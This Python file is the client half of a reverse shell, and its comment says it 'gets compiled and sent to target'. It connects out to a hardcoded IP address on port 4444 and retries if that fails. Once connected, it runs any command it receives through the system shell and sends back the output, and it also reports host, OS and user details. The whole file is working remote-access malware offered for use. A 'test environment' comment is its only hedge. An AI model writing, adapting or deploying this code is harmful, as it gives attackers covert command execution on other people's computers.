# client.py - This gets compiled and sent to target
import socket
import subprocess
import os
import sys
import time

def connect_to_server(server_ip, server_port):
    max_retries = 5
    retry_delay = 10
    
    for attempt in range(max_retries):
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((server_ip, server_port))
            return client
        except Exception as e:
            if attempt < max_retries - 1:
                time.sleep(retry_delay)
            else:
                return None

def main():
    # Configure these for your test environment
    SERVER_IP = "27.34.66.37"  # Replace with your IP
    SERVER_PORT = 4444
    
    client = connect_to_server(SERVER_IP, SERVER_PORT)
    if not client:
        sys.exit()
    
    try:
        while True:
            # Receive command prompt
            prompt = client.recv(1024).decode()
            
            # Receive command
            command = client.recv(1024).decode().strip()
            
            if command.lower() == 'exit':
                break
            elif command.startswith('cd '):
                try:
                    os.chdir(command[3:])
                    response = f"Changed to: {os.getcwd()}"
                except Exception as e:
                    response = f"Error: {str(e)}"
                client.send(response.encode())
            elif command == 'sysinfo':
                import platform
                info = f"""
System: {platform.system()}
Node: {platform.node()}
Release: {platform.release()}
Version: {platform.version()}
Machine: {platform.machine()}
Processor: {platform.processor()}
Current Directory: {os.getcwd()}
User: {os.getenv('USERNAME', os.getenv('USER', 'Unknown'))}
                """
                client.send(info.encode())
            else:
                try:
                    # Execute command
                    result = subprocess.run(command, shell=True, capture_output=True, text=True)
                    output = result.stdout + result.stderr
                    if not output:
                        output = "Command executed (no output)"
                    client.send(output.encode())
                except Exception as e:
                    client.send(f"Error: {str(e)}".encode())
                    
    except Exception as e:
        pass
    finally:
        client.close()

if __name__ == "__main__":
    main()
